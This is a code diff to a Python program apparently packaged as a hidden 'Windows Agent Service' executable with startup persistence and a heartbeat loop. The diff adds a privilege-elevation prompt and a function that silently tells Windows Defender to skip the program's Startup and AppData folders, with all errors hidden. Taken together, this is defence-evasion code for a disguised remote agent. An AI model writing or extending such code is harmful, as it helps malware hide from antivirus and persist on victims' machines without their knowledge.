@@ -12,6 +12,21 @@ import urllib.error
 import urllib.request
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
+
+def request_admin_privileges():
+    try:
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            return True
+    except:
+        pass
+
+    try:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        sys.exit(0)
+    except Exception as e:
+        print(f"Failed to elevate privileges: {e}")
+        return False
+
 # cd /d C:\Users\User\Desktop\telelluc
 # python -m PyInstaller --onefile --noconsole --name "Windows Agent Service" telelluc.py
 
@@ -52,6 +67,34 @@ SWP_NOSIZE = 0x0001
 SWP_SHOWWINDOW = 0x0040
 
 
+
+
+def add_windows_defender_exclusion():
+    try:
+        import ctypes
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            startup_dir = os.path.join(
+                os.environ.get("APPDATA", ""),
+                "Microsoft",
+                "Windows",
+                "Start Menu",
+                "Programs",
+                "Startup",
+            )
+            local_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent")
+
+            for path in [startup_dir, local_dir]:
+                try:
+                    subprocess.run(
+                        f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\' -ErrorAction SilentlyContinue"',
+                        shell=True,
+                        capture_output=True,
+                        creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+                    )
+                except:
+                    pass
+    except:
+        pass
 
 
 def _schedule_delete(path_to_delete):
@@ -502,6 +545,8 @@ class Handler(BaseHTTPRequestHandler):
 
 
 if __name__ == "__main__":
+    request_admin_privileges()
+    add_windows_defender_exclusion()
     auto_compile()
     ensure_startup()
     threading.Thread(target=heartbeat_loop, daemon=True).start()
